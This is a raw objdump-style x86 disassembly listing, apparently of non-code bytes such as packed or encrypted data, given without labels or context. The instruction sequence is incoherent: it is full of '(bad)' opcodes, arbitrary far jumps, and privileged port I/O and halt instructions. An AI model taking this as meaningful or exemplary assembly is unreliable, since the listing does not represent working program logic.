  41ca30:	mov    cl,0xd2
  41ca32:	(bad)
  41ca35:	sbb    dl,BYTE PTR [edi+0x68b0ef64]
  41ca3b:	mov    dl,0x42
  41ca3d:	push   ss
  41ca3e:	retf   
  41ca3f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ca40:	and    al,cl
  41ca42:	and    BYTE PTR [ecx+edx*8+0x3c7f6d21],dh
  41ca49:	mov    cl,0x7d
  41ca4b:	pop    ds
  41ca4c:	popa   
  41ca4d:	loope  0x41cacb
  41ca4f:	adc    DWORD PTR [edx],ecx
  41ca51:	hlt    
  41ca52:	retf   
  41ca53:	xchg   dh,al
  41ca55:	repz add eax,0x6332cead
  41ca5b:	rol    ebx,1
  41ca5d:	cmp    ch,BYTE PTR [edi+0x54]
  41ca60:	test   DWORD PTR [ecx],eax
  41ca62:	mov    bl,0xe8
  41ca64:	cmp    edi,DWORD PTR [ebx]
  41ca66:	dec    eax
  41ca67:	jmp    0xa5fe:0x68b17093
  41ca6e:	or     BYTE PTR ds:0xcc190534,ah
  41ca74:	lods   eax,DWORD PTR ds:[esi]
  41ca75:	call   0x7508:0x48130dd1
  41ca7c:	or     DWORD PTR es:[ecx+0x49413ec9],esi
  41ca83:	fld    QWORD PTR [edi+0x75]
  41ca86:	out    0xb0,al
  41ca88:	daa    
  41ca89:	push   0xffffffc4
  41ca8b:	mov    edx,0xd85abb74
  41ca90:	xchg   ebx,eax
  41ca91:	jle    0x41ca8d
  41ca93:	aad    0x90
  41ca95:	pushf  
  41ca96:	es test eax,0x6d80cafe
  41ca9c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ca9d:	push   esi
  41ca9e:	cmc    
  41ca9f:	or     al,0x13
  41caa1:	jb     0x41ca68
  41caa3:	mov    bl,0xe6
  41caa5:	inc    ebp
  41caa6:	ins    BYTE PTR es:[edi],dx
  41caa7:	jo     0x41cb24
  41caa9:	xchg   DWORD PTR [ebp+0x2d7968c1],ebx
  41caaf:	cdq    
  41cab0:	aad    0x1e
  41cab2:	jno    0x41cad6
  41cab4:	pushf  
  41cab5:	jo     0x41ca6b
  41cab7:	jmp    0x71a0b71f
  41cabc:	shld   DWORD PTR [edx],edi,0xac
  41cac0:	jecxz  0x41cab1
  41cac2:	popf   
  41cac3:	and    DWORD PTR [esi],ebx
  41cac5:	mov    ah,0x57
  41cac7:	adc    eax,0xfaa7ef17
  41cacc:	loop   0x41ca87
  41cace:	daa    
  41cacf:	(bad)  
  41cad0:	lock dec esi
  41cad2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41cad3:	cli    
  41cad4:	mov    cl,0x19
  41cad6:	(bad)  
  41cad8:	and    eax,0x2f85f917
  41cadd:	out    0x4a,al
  41cadf:	and    DWORD PTR [ebx-0x21],eax
  41cae2:	in     al,0x60
  41cae4:	dec    esp
  41cae5:	xor    BYTE PTR ds:0xdab648ae,ch
  41caeb:	call   FWORD PTR [edx+0x6e518e2a]
  41caf1:	xchg   edx,eax
  41caf2:	sbb    DWORD PTR [edi+0x21],eax
  41caf5:	mov    ebx,0xc15ce13c
  41cafa:	push   edx
  41cafb:	arpl   WORD PTR [ebp+0x4b13a7b],dx
  41cb01:	scas   eax,DWORD PTR es:[edi]
  41cb02:	push   DWORD PTR [edi-0x655887e7]
  41cb08:	mov    DWORD PTR [esi+edx*2+0x53],eax
  41cb0c:	fist   WORD PTR [esi+0xbacb8a6]
  41cb12:	or     al,0xae
  41cb14:	shl    BYTE PTR [edx-0x5fbc9245],cl
  41cb1a:	in     eax,dx
  41cb1b:	and    eax,0x68ec59b9
  41cb20:	int3   
  41cb21:	lock std 
  41cb23:	mov    ebx,0x508c9952
  41cb28:	jne    0x41cabb
  41cb2a:	jmp    0x50b6:0x819450f0
  41cb31:	int    0x6d
  41cb33:	xor    ecx,ecx
  41cb35:	fsub   st(4),st
  41cb37:	clc    
  41cb38:	cmp    ch,cl
  41cb3a:	test   eax,0xed57bb1f
  41cb3f:	imul   esi,DWORD PTR [edx+0x4a],0xaea124f0
  41cb46:	xchg   esp,eax
  41cb47:	iret   
  41cb48:	dec    ecx
  41cb49:	inc    esp
  41cb4a:	jg     0x41cb13
  41cb4c:	retf   0x1dd5
  41cb4f:	adc    al,0x9f
  41cb51:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41cb52:	pop    eax
  41cb53:	mov    eax,DWORD PTR ss:[ecx]
  41cb56:	sahf   
  41cb57:	sub    al,0x87
  41cb59:	fwait
  41cb5a:	aaa    
  41cb5b:	cmp    al,BYTE PTR [eax]
  41cb5d:	pushf  
  41cb5e:	enter  0xd42b,0xe3
  41cb62:	dec    DWORD PTR [edx]
  41cb64:	das    
  41cb65:	adc    bh,BYTE PTR [edi+esi*2-0x52]
  41cb69:	pusha  
  41cb6a:	in     eax,dx
  41cb6b:	sbb    DWORD PTR [esi+0x175823a8],edi
  41cb71:	push   eax
  41cb72:	mov    dh,ah
  41cb74:	sbb    DWORD PTR [esi],edi
  41cb76:	mov    esp,0x4f19530c
  41cb7b:	mov    bl,0x2f
  41cb7d:	push   0xffffffa0
  41cb7f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41cb80:	ror    DWORD PTR [edx+0x1b],1
  41cb83:	push   0x6c1b7f15
  41cb88:	int    0xd4
  41cb8a:	jmp    0xa4fc:0xc2796179
  41cb91:	hlt    
  41cb92:	inc    ebp
  41cb93:	jmp    0xf2cd22b5
  41cb98:	or     BYTE PTR [eax*1-0x33f48160],ah
  41cb9f:	or     eax,0x397eba1e
  41cba4:	push   ebp
  41cba5:	mov    al,0x88
  41cba7:	add    BYTE PTR [esi-0x5f],bl
  41cbaa:	ret    0x907b
  41cbad:	adc    bh,BYTE PTR [ebp-0x50cefd90]
  41cbb3:	arpl   WORD PTR [esi],cx
  41cbb5:	or     dh,ah
  41cbb7:	loop   0x41cb60
  41cbb9:	add    eax,0x872d7bde
  41cbbe:	lods   al,BYTE PTR ds:[esi]
  41cbbf:	ds mov al,0xa
  41cbc2:	int    0x6e
  41cbc4:	adc    DWORD PTR [eax],ecx
  41cbc6:	cmp    DWORD PTR [ebx+0x53],edx
  41cbc9:	jle    0x41cc3f
  41cbcb:	aad    0x19
  41cbcd:	pop    edi
  41cbce:	(bad)  
  41cbcf:	and    eax,0xe0d51760
  41cbd4:	aaa    
  41cbd5:	mov    ah,0xa0
  41cbd7:	jl     0x41cc40
  41cbd9:	push   cs
  41cbda:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41cbdb:	ins    DWORD PTR es:[edi],dx
  41cbdc:	repz dec BYTE PTR [ebp+0x11]
  41cbe0:	adc    ch,dl
  41cbe2:	push   eax
  41cbe3:	add    ebp,DWORD PTR [ebp+edx*8-0x4]
  41cbe7:	jl     0x41cc17
  41cbe9:	push   eax
  41cbea:	inc    ebx
  41cbeb:	clc    
  41cbec:	pop    es
  41cbed:	ret    
  41cbee:	sub    DWORD PTR [ecx+0x1ff54174],esi
  41cbf4:	call   0xcb23:0xef8b1d88
  41cbfb:	fistp  WORD PTR [edi+ecx*4+0x293ce39c]
  41cc02:	jle    0x41cba3
  41cc04:	and    ah,BYTE PTR [ebx]
  41cc06:	push   edi
  41cc07:	or     al,0xab
  41cc09:	jge    0x41cb92
  41cc0b:	xor    al,0x9e
  41cc0d:	icebp  
  41cc0e:	xchg   ecx,eax
  41cc0f:	std    
  41cc10:	mov    eax,0x7c7bdcda
  41cc15:	sbb    eax,0x5a9d122
  41cc1a:	clc    
  41cc1b:	push   eax
  41cc1c:	xlat   BYTE PTR ds:[ebx]
  41cc1d:	in     eax,0xc6
  41cc1f:	aas    
  41cc20:	sti    
  41cc21:	adc    dl,BYTE PTR [esi+0x756f7f61]
  41cc27:	xor    BYTE PTR [ecx+0x3d7f490d],bh
  41cc2d:	mov    eax,ds:0xb631c0df
  41cc32:	lods   al,BYTE PTR ds:[esi]
  41cc33:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41cc34:	adc    eax,0x8cb88939
  41cc39:	test   esi,esp
  41cc3b:	lea    esi,[edi+0x4e]
  41cc3e:	nop
  41cc3f:	(bad)  
  41cc40:	call   0xf7ba7148
  41cc45:	cli    
  41cc46:	adc    DWORD PTR [ecx+ebx*1+0x62],ebx
  41cc4a:	push   ecx
  41cc4b:	das    
  41cc4c:	stos   DWORD PTR es:[edi],eax
  41cc4d:	pusha  
  41cc4e:	sub    BYTE PTR ds:0x8ad699fd,dh
  41cc54:	cwde   
  41cc55:	xor    edi,esi
  41cc57:	xor    bl,dh
  41cc59:	lahf   
  41cc5a:	sbb    ch,dh
  41cc5c:	mov    ebp,0xd45f0120
  41cc61:	js     0x41cc7f
  41cc63:	arpl   WORD PTR [esp+esi*8],bx
  41cc66:	inc    ecx
  41cc67:	and    BYTE PTR [edi-0x2a2ba490],dl
  41cc6d:	dec    esi
  41cc6e:	fbld   TBYTE PTR es:[ecx]
  41cc71:	or     eax,DWORD PTR [eax+0x2]
  41cc74:	ins    BYTE PTR es:[edi],dx
  41cc75:	fwait
  41cc76:	add    eax,esi
  41cc78:	lds    ecx,FWORD PTR [edx]
  41cc7a:	fsub   QWORD PTR [esi-0x3b]
  41cc7d:	jno    0x41cc90
  41cc7f:	into   
  41cc80:	test   BYTE PTR [ebx-0x2c],bl
  41cc83:	outs   dx,DWORD PTR ds:[esi]
  41cc84:	arpl   ax,bx
  41cc86:	jp     0x41cc40
  41cc88:	push   ebp
  41cc89:	aam    0x71
  41cc8b:	outs   dx,DWORD PTR ds:[esi]
  41cc8c:	or     al,cl
  41cc8e:	push   ecx
  41cc8f:	mov    bh,0x9e
  41cc91:	pusha  
  41cc92:	and    DWORD PTR [eax-0x12],edx
  41cc95:	fld    DWORD PTR [eax-0x6a81371e]
  41cc9b:	adc    ax,bp
  41cc9e:	mov    edx,0x79734553
  41cca3:	push   ebx
  41cca4:	popa   
  41cca5:	retf   
  41cca6:	lea    ebp,[eax+0x4c]
  41cca9:	pop    ds
  41ccaa:	xchg   esp,eax
  41ccab:	jg     0x41ccb1
  41ccad:	in     al,dx
  41ccae:	pcmpgtd mm7,QWORD PTR [ecx+ecx*2+0x24]
  41ccb3:	rcr    BYTE PTR [edi],cl
  41ccb5:	jnp    0x41cc7d
  41ccb7:	mov    esi,0xe000788f
  41ccbc:	mov    WORD PTR [ebx+0x68abf4fb],es
  41ccc2:	fwait
  41ccc3:	stos   BYTE PTR es:[edi],al
  41ccc4:	push   ebx
  41ccc5:	arpl   WORD PTR [eax+0x443ab8cf],bx
  41cccb:	pop    eax
  41cccc:	loopne 0x41ccf0
  41ccce:	push   ds
  41cccf:	addr16 je 0x41cca0
  41ccd2:	sub    DWORD PTR [ecx+esi*4],esi
  41ccd5:	test   al,0xae
  41ccd7:	(bad)  
  41ccd9:	out    0xc0,eax
  41ccdb:	into   
  41ccdc:	dec    ebx
  41ccdd:	les    esp,FWORD PTR [ebp*4+0x55c03cc0]
  41cce4:	push   edi
  41cce5:	stc    
  41cce6:	mov    bh,0x25
  41cce8:	sub    ecx,ecx
  41ccea:	mov    cl,BYTE PTR [ecx+0x27652252]
  41ccf0:	add    eax,0xc7c2d25c
  41ccf5:	ja     0x41cd29
  41ccf7:	add    BYTE PTR [edx-0x744d6dad],0xde
  41ccfe:	fstp   TBYTE PTR [ebx+0x13]
  41cd01:	inc    edx
  41cd02:	ficom  WORD PTR [ebx-0x58]
  41cd05:	repnz cs mov ebx,0x4e8fa866
  41cd0c:	lods   al,BYTE PTR ds:[esi]
  41cd0d:	xor    BYTE PTR [ebx-0x11ed7b18],al
  41cd13:	push   ds
  41cd14:	jecxz  0x41cc97
  41cd16:	push   ebx
  41cd17:	imul   edi,DWORD PTR [eax-0x57718650],0xffffff90
  41cd1e:	and    ecx,esi
  41cd20:	or     eax,0x7c41d86d
  41cd25:	shl    ah,1
  41cd27:	jp     0x41ccab
  41cd29:	push   0x1d66e47c
  41cd2e:	pop    eax
  41cd2f:	push   ss
  41cd30:	add    BYTE PTR [ecx+ebp*2-0x6b04229e],dh
  41cd37:	xor    ch,bh
  41cd39:	rcr    DWORD PTR [edi+0x20],1
  41cd3c:	and    edi,DWORD PTR [ebp-0x358b09e1]
  41cd42:	sub    DWORD PTR [ecx+0x2191bd0d],esp
  41cd48:	int    0x6c
  41cd4a:	fbstp  TBYTE PTR [edi-0x48]
  41cd4d:	fdiv   st,st(3)
  41cd4f:	cld    
  41cd50:	xchg   ebp,eax
  41cd51:	shr    DWORD PTR [eax-0x25],0xe6
  41cd55:	out    0x13,al
  41cd57:	xchg   ebp,eax
  41cd58:	or     al,0x95
  41cd5a:	sbb    bh,dh
  41cd5c:	or     al,0xd7
  41cd5e:	pop    ds
  41cd5f:	pop    eax
  41cd60:	js     0x41ccf0
  41cd62:	add    BYTE PTR [ebx+0x1b06a875],ah
  41cd68:	push   esp
  41cd69:	popa   
  41cd6a:	or     eax,0x3a37819a
  41cd6f:	gs (bad) 
  41cd71:	cmp    edx,DWORD PTR [edx-0x6f49c653]
  41cd77:	and    al,BYTE PTR [edi+esi*1-0x5fdbe39a]
  41cd7e:	or     eax,0x52c17af9
  41cd83:	sar    DWORD PTR [edx-0x22],cl
  41cd86:	test   eax,0x3cc74e0d
  41cd8b:	nop
  41cd8c:	scas   al,BYTE PTR es:[edi]
  41cd8d:	inc    edx
  41cd8e:	mov    ah,0x54
  41cd90:	test   BYTE PTR [esp+esi*8-0x50a3ffdf],0x4
  41cd98:	xchg   ecx,eax
  41cd99:	aaa    
  41cd9a:	icebp  
  41cd9b:	sahf   
  41cd9c:	mov    cl,0x5c
  41cd9e:	into   
  41cd9f:	xchg   esi,eax
  41cda0:	mov    ebx,0x2428ea37
  41cda5:	(bad)  
  41cda6:	adc    al,0xcf
  41cda8:	push   ebx
  41cda9:	pop    esi
  41cdaa:	mov    esp,esi
  41cdac:	add    ah,BYTE PTR [edx-0x4f4c7fc2]
  41cdb2:	xor    al,0x9a
  41cdb4:	pop    edi
  41cdb5:	imul   esp,DWORD PTR [edi+ebp*4-0x29],0xa5cdd5c3
  41cdbd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41cdbe:	ffreep st(2)
  41cdc0:	and    cl,bh
  41cdc2:	ror    DWORD PTR [ecx+0x7f480220],0x22
  41cdc9:	daa    
  41cdca:	fcom   DWORD PTR [eax-0x60]
  41cdcd:	cs std 
  41cdcf:	adc    DWORD PTR [ebx],eax
  41cdd1:	enter  0x6c4e,0xe5
  41cdd5:	push   ebp
  41cdd6:	jbe    0x41cd7d
  41cdd8:	xchg   ebp,eax
  41cdd9:	imul   ebx,DWORD PTR [eax],0x47
  41cddc:	add    al,0xef
  41cdde:	sahf   
  41cddf:	sbb    DWORD PTR [eax],esp
  41cde1:	xchg   esp,eax
  41cde2:	xor    al,0xd1
  41cde4:	pop    es
  41cde5:	pop    ss
  41cde6:	in     al,dx
  41cde7:	jp     0x41cd96
  41cde9:	mov    esp,0x694a67c0
  41cdee:	je     0x41ce49
  41cdf0:	xor    DWORD PTR [edx+0x7049bfe1],0x76
  41cdf7:	mov    edx,0x1e5e81e6
  41cdfc:	ss jo  0x41cd84
  41cdff:	hlt    
  41ce00:	repz dec esp
  41ce02:	iret   
  41ce03:	pslld  mm3,QWORD PTR [esi-0x64]
  41ce07:	pop    ss
  41ce08:	int3   
  41ce09:	call   0xe382:0x3158bdba
  41ce10:	adc    eax,DWORD PTR [eax]
  41ce12:	and    ecx,DWORD PTR [esi]
  41ce14:	pop    eax
  41ce15:	adc    eax,0xa5e95eb1
  41ce1a:	stos   BYTE PTR es:[edi],al
  41ce1b:	sub    bl,BYTE PTR [eax+0x14]
  41ce1e:	mov    ah,BYTE PTR [esi+0x69]
  41ce21:	adc    esi,DWORD PTR [esi+0x38]
  41ce24:	jecxz  0x41cda6
  41ce26:	xor    DWORD PTR [edi+edi*4],0xffffff80
  41ce2a:	aaa    
  41ce2b:	aad    0x52
  41ce2d:	test   DWORD PTR [edi+0x43],esp
  41ce30:	rcl    BYTE PTR [esi-0x61],cl
  41ce33:	cmc    
  41ce34:	add    esi,edx
  41ce36:	lds    edi,FWORD PTR [edi+eiz*4]
  41ce39:	dec    esp
  41ce3a:	out    0x59,eax
  41ce3c:	pop    edx
  41ce3d:	out    0xf7,eax
  41ce3f:	adc    DWORD PTR [edi+0x6b],0xffffff83
  41ce43:	aad    0x7
  41ce45:	or     edi,DWORD PTR [eax+edi*2+0x23]
  41ce49:	aad    0xa1
  41ce4b:	retf   0x192b
  41ce4e:	std    
  41ce4f:	call   0x3994566d
  41ce54:	cmp    bl,bl
  41ce56:	pop    ebp
  41ce57:	(bad)  
  41ce58:	push   esp
  41ce59:	and    al,0x29
  41ce5b:	pop    esi
  41ce5c:	mov    ch,0xbf
  41ce5e:	lea    edx,[esi-0x529d34b7]
  41ce64:	fdiv   st(1),st
  41ce66:	into   
  41ce67:	std    
  41ce68:	cmp    ch,cl
  41ce6a:	cmp    edi,DWORD PTR [edx]
  41ce6c:	(bad)  
  41ce6d:	pop    si
  41ce6f:	mov    bl,0xfb
  41ce71:	shl    bh,0xd1
  41ce74:	loope  0x41ce3c
  41ce76:	push   eax
  41ce77:	xor    dl,ch
  41ce79:	pop    edi
  41ce7a:	fcomp  DWORD PTR [ebp-0x49]
  41ce7d:	lds    esp,FWORD PTR [esp+eiz*4]
  41ce80:	out    0xfa,eax
  41ce82:	pusha  
  41ce83:	lea    ecx,[eax-0x9]
  41ce86:	fwait
  41ce87:	retf   0x203b
  41ce8a:	js     0x41ce99
  41ce8c:	mov    edi,DWORD PTR [edi]
  41ce8e:	sub    al,0xf0
  41ce90:	cmp    ecx,DWORD PTR [ebp-0x3c]
  41ce93:	call   0x1bc0efc1
  41ce98:	in     eax,0x98
  41ce9a:	out    0x0,eax
  41ce9c:	not    DWORD PTR [esi*2-0x217a2e7c]
  41cea3:	addr16 cs pop eax
  41cea6:	je     0x41ce2e
  41cea8:	inc    ebx
  41cea9:	jmp    0xcf2285c4
  41ceae:	and    ebp,ecx
  41ceb0:	sub    eax,0x5c
  41ceb3:	push   0x1714b678
  41ceb8:	mov    eax,0x8d5c1fe2
  41cebd:	pusha  
  41cebe:	xor    dh,0x5
  41cec1:	or     eax,0xefc224f3
  41cec6:	sub    DWORD PTR [ebx],ebx
  41cec8:	dec    ebx
  41cec9:	outs   dx,DWORD PTR ds:[esi]
  41cecb:	mov    eax,esp
  41cecd:	xchg   esi,eax
  41cece:	jo     0x41cf1b
  41ced0:	or     BYTE PTR [eax-0x7e],ah
  41ced3:	clc    
  41ced4:	es call 0xede2:0x98eb5063
  41cedc:	loopne 0x41cede
  41cede:	popa   
  41cedf:	jnp    0x41ce7d
  41cee1:	pop    ebp
  41cee2:	ret    0x962d
  41cee5:	mov    esp,0x28a7ae87
  41ceea:	out    dx,al
  41ceeb:	jno    0x41ced0
  41ceed:	pop    ebx
  41ceee:	mov    ds:0xd921c4fb,al
  41cef3:	sbb    ebp,edi
  41cef5:	loope  0x41cf3b
  41cef7:	mov    dh,BYTE PTR [ebx-0x6a]
  41cefa:	or     BYTE PTR [eax],cl
  41cefc:	call   DWORD PTR [ecx+0x6c]
  41ceff:	mov    dl,0xd5
  41cf01:	stc    
  41cf02:	outs   dx,DWORD PTR ds:[esi]
  41cf03:	aaa    
  41cf04:	fimul  WORD PTR [ebx]
  41cf06:	dec    ebx
  41cf07:	dec    edx
  41cf08:	sbb    ebp,DWORD PTR [esi]
  41cf0a:	les    eax,FWORD PTR [ebx]
  41cf0c:	test   eax,0x9741de1f
  41cf11:	jmp    0x41cef0
  41cf13:	inc    esi
  41cf14:	jg     0x41cf49
  41cf16:	test   BYTE PTR [edx],dl
  41cf18:	les    esp,FWORD PTR [edx]
  41cf1a:	dec    edi
  41cf1b:	jae    0x41cef2
  41cf1d:	mov    ebx,0x953752c1
  41cf22:	mov    dh,0xaf
  41cf24:	push   eax
  41cf25:	and    DWORD PTR [ebp+0x11123480],edi
  41cf2b:	mov    eax,eax
  41cf2d:	je     0x41cebc
  41cf2f:	pop    ds
  41cf30:	push   edx
  41cf31:	sbb    ah,BYTE PTR [edi+0x32]
  41cf34:	jmp    DWORD PTR [ecx+0x7f8abed2]
  41cf3a:	push   esp
  41cf3b:	push   0x28
  41cf3d:	jno    0x41cee3
  41cf3f:	jp     0x41cec4
  41cf41:	adc    al,0xd6
  41cf43:	outs   dx,BYTE PTR ds:[esi]
  41cf44:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41cf45:	jbe    0x41ced1
  41cf47:	pop    ebx
  41cf48:	loopne 0x41cf28
  41cf4a:	cs mov eax,0xde171102
  41cf50:	cmp    BYTE PTR ds:0x688634db,0xbd
  41cf57:	lahf   
  41cf58:	inc    edi
  41cf59:	jp     0x41cf3e
  41cf5b:	xor    al,BYTE PTR [ebx-0x39206ba2]
  41cf61:	pop    ebx
  41cf62:	xlat   BYTE PTR ds:[ebx]
  41cf63:	mov    edx,0x360a9071
  41cf68:	sti    
  41cf69:	repnz imul ebx,DWORD PTR [eax-0x39],0x4e
  41cf6e:	xlat   BYTE PTR ss:[ebx]
  41cf70:	leave  
  41cf71:	inc    ebx
  41cf72:	xor    eax,0xa8b083ef
  41cf77:	sahf   
  41cf78:	out    dx,al
  41cf79:	retf   0x8dcb
  41cf7c:	es xchg ebp,eax
  41cf7e:	je     0x41cf36
  41cf80:	adc    al,0xa3
  41cf82:	cmc    
  41cf83:	sub    al,0x60
  41cf85:	scas   al,BYTE PTR es:[edi]
  41cf86:	dec    ecx
  41cf87:	xchg   ebx,eax
  41cf88:	aas    
  41cf89:	popf   
  41cf8a:	aam    0x16
  41cf8c:	icebp  
  41cf8d:	xor    ebx,ebx
  41cf8f:	pop    es
  41cf90:	daa    
  41cf91:	xchg   esp,eax
  41cf92:	push   esp
  41cf93:	or     eax,edi
  41cf95:	outs   dx,DWORD PTR ds:[esi]
  41cf96:	(bad)  
  41cf97:	jmp    0x7951:0x9e9405bf
  41cf9e:	adc    eax,0xdc1c2cea
  41cfa3:	cs cdq 
  41cfa5:	mov    ah,0xbb
  41cfa7:	popf   
  41cfa8:	jge    0x41d00d
  41cfaa:	sub    BYTE PTR [ebx-0x4c497549],dh
  41cfb0:	retf   0x5f5
  41cfb3:	enter  0x1afb,0x7a
  41cfb7:	test   BYTE PTR [edx-0x218e518e],0x78
  41cfbe:	imul   esi,edx,0xa2f752e3
  41cfc4:	mov    bl,0xf5
  41cfc6:	jecxz  0x41cff9
  41cfc8:	or     bl,BYTE PTR [ebp+0x4688a3fe]
  41cfce:	xor    BYTE PTR [ebx-0x29f04315],cl
  41cfd4:	jmp    0x41cf65
  41cfd6:	inc    esi
  41cfd7:	xchg   ebp,eax
  41cfd8:	xchg   ebp,eax
  41cfd9:	cli    
  41cfda:	icebp  
  41cfdb:	inc    ecx
  41cfdc:	ror    edi,cl
  41cfde:	dec    eax
  41cfdf:	call   0xcb007de6
  41cfe4:	stos   BYTE PTR es:[edi],al
  41cfe5:	xchg   ecx,eax
  41cfe6:	push   ebx
  41cfe7:	stc    
  41cfe8:	inc    eax
  41cfe9:	aas    
  41cfea:	scas   al,BYTE PTR es:[edi]
  41cfeb:	pop    ebp
  41cfec:	xor    bl,dh
  41cfee:	test   BYTE PTR [edi+0x34],dh
  41cff1:	cmp    DWORD PTR [edi-0x20],esp
  41cff4:	push   cs
  41cff5:	stos   BYTE PTR es:[edi],al
  41cff6:	sbb    dl,bh
  41cff8:	xchg   edi,eax
  41cff9:	inc    ecx
  41cffa:	stos   DWORD PTR es:[edi],eax
  41cffb:	arpl   WORD PTR [ebp+0x1],di
  41cffe:	out    0x28,al
  41d000:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d001:	push   esp
  41d002:	cmc    
  41d003:	mov    dh,0x6b
  41d005:	repnz xor edx,DWORD PTR [edx+0x10517cd7]
  41d00c:	cs ja  0x41cfad
  41d00f:	dec    esi
  41d010:	mov    eax,0xfaa691ca
  41d015:	sbb    BYTE PTR [eax],dh
  41d017:	test   BYTE PTR [esi],ch
  41d019:	inc    esp
  41d01a:	sub    bh,ch
  41d01c:	xchg   DWORD PTR [ebx],esi
  41d01e:	cmp    BYTE PTR [ecx+0x58f1565e],dl
  41d024:	mov    ecx,0x595f7aa
  41d029:	cdq    
  41d02a:	fwait
  41d02b:	ret    0x3c1c
  41d02e:	cmp    eax,0xa7576595
  41d033:	jecxz  0x41d068
  41d035:	xlat   BYTE PTR ds:[ebx]
  41d036:	fs jb  0x41cff6
  41d039:	arpl   WORD PTR [ecx-0x503d82a0],cx
  41d03f:	push   esp
  41d040:	push   edx
  41d041:	inc    edx
  41d042:	push   cs
  41d043:	fs mov ebx,0xa282984a
  41d049:	fmul   st,st(0)
  41d04b:	cmp    esp,DWORD PTR [edi+0x72]
  41d04e:	mov    ds:0x3e08122d,eax
  41d053:	inc    ebp
  41d054:	xchg   bx,ax
  41d056:	sub    al,0x18
  41d058:	call   0x14441f3d
  41d05d:	aas    
  41d05e:	jg     0x41d0c7
  41d060:	sub    al,0x10
  41d062:	ins    BYTE PTR es:[edi],dx
  41d063:	or     DWORD PTR [ebp+edx*8-0x7c],eax
  41d067:	(bad)  
  41d068:	out    0x23,al
  41d06a:	xor    al,0x7e
  41d06c:	dec    edi
  41d06d:	or     DWORD PTR [edx+0xe7af98],0x3f
  41d074:	les    esp,FWORD PTR [ebp+0x9]
  41d077:	repz shl bl,1
  41d07a:	xlat   BYTE PTR ds:[ebx]
  41d07b:	hlt    
  41d07c:	xor    bl,cl
  41d07e:	xchg   ebp,eax
  41d07f:	push   0x28aa113d
  41d084:	xor    ebx,DWORD PTR [ecx-0x55]
  41d087:	repnz out dx,eax
  41d089:	ja     0x41d09e
  41d08b:	lods   eax,DWORD PTR ds:[esi]
  41d08c:	add    eax,DWORD PTR [edx]
  41d08e:	repz in al,0x45
  41d091:	add    esi,DWORD PTR ds:[eax-0x43cae2b0]
  41d098:	sub    al,0xb7
  41d09a:	mov    ebx,0xc53b6946
  41d09f:	cmovo  esi,ebx
  41d0a2:	pop    eax
  41d0a3:	mov    ds:0x5781637d,al
  41d0a8:	repnz mov bl,0x5a
  41d0ab:	inc    eax
  41d0ac:	sti    
  41d0ad:	dec    edx
  41d0ae:	scas   eax,DWORD PTR es:[edi]
  41d0af:	inc    edx
  41d0b0:	enter  0x5d8c,0x5d
  41d0b4:	pop    ds
  41d0b5:	iret   
  41d0b6:	xchg   esi,eax
  41d0b7:	jle    0x41d0f2
  41d0b9:	jmp    0x41d126
  41d0bb:	ja     0x41d095
  41d0bd:	mov    esi,eax
  41d0bf:	cs mov ebp,0xddc38357
  41d0c5:	lods   al,BYTE PTR ds:[esi]
  41d0c6:	loope  0x41d0dd
  41d0c8:	push   ecx
  41d0c9:	fidiv  DWORD PTR [ebp+esi*4-0x1660e268]
  41d0d0:	xchg   esi,eax
  41d0d1:	jmp    0x9979:0xc559e121
  41d0d8:	(bad)  
  41d0d9:	dec    esp
  41d0da:	sti    
  41d0db:	or     bh,BYTE PTR [esi]
  41d0dd:	xchg   ebp,eax
  41d0de:	xchg   DWORD PTR [esi-0x248ddb5f],ebx
  41d0e4:	dec    esi
  41d0e5:	inc    esp
  41d0e6:	xlat   BYTE PTR ds:[ebx]
  41d0e7:	ror    BYTE PTR [ebp+edi*8+0x3a],1
  41d0eb:	cmp    al,0x97
  41d0ed:	xchg   ebp,eax
  41d0ee:	sbb    BYTE PTR [edi],bh
  41d0f0:	push   ebp
  41d0f1:	lods   al,BYTE PTR ds:[esi]
  41d0f2:	cdq    
  41d0f3:	repz sti 
  41d0f5:	xchg   edx,edx
  41d0f7:	sar    DWORD PTR [ebx+0x37],0x2c
  41d0fb:	push   ebx
  41d0fc:	cmp    esp,DWORD PTR gs:[ebx]
  41d0ff:	inc    esi
  41d100:	cmp    DWORD PTR [ebp-0x7ea254d],esp
  41d106:	je     0x41d0d7
  41d108:	cmp    al,0x42
  41d10a:	pop    edx
  41d10b:	mov    eax,0xb0ca4359
  41d110:	jge    0x41d15f
  41d112:	fsub   st,st(2)
  41d114:	push   esi
  41d115:	hlt    
  41d116:	popf   
  41d117:	in     eax,dx
  41d118:	and    DWORD PTR [ebp-0x7e],ebx
  41d11b:	scas   al,BYTE PTR es:[edi]
  41d11c:	mov    ah,BYTE PTR [eax]
  41d11e:	jb     0x41d153
  41d120:	sub    eax,0xc2c79db9
  41d125:	and    dh,0x64
  41d128:	cmp    BYTE PTR [ebp+esi*1-0x53],dl
  41d12c:	aas    
  41d12d:	pop    esi
  41d12f:	add    BYTE PTR gs:[eax+0x3a2b4c74],cl
  41d136:	mov    dl,0xf
  41d138:	dec    ebp
  41d139:	ror    BYTE PTR [eax],1
  41d13b:	add    al,0x66
  41d13d:	out    0x5c,eax
  41d13f:	cmp    bh,BYTE PTR [edx]
  41d141:	bound  esi,QWORD PTR [esp+ecx*8+0x35faa547]
  41d148:	stc    
  41d149:	sub    ch,BYTE PTR [edx+0x6d]
  41d14c:	stc    
  41d14d:	xor    esi,DWORD PTR [edi+0x60]
  41d150:	or     BYTE PTR [esi-0x15f4f7ed],cl
  41d156:	in     al,0x35
  41d158:	fdivr  QWORD PTR [ecx]
  41d15a:	sbb    eax,0x2bfe5dd9
  41d15f:	add    esp,DWORD PTR [edi]
  41d161:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d162:	int    0x9b
  41d164:	les    ebx,FWORD PTR [ecx-0x39]
  41d167:	pop    edx
  41d168:	dec    esp
  41d169:	fmul   DWORD PTR [ebx-0x39b4c09c]
  41d170:	jle    0x41d18b
  41d172:	and    BYTE PTR ds:0x5c6feed1,bh
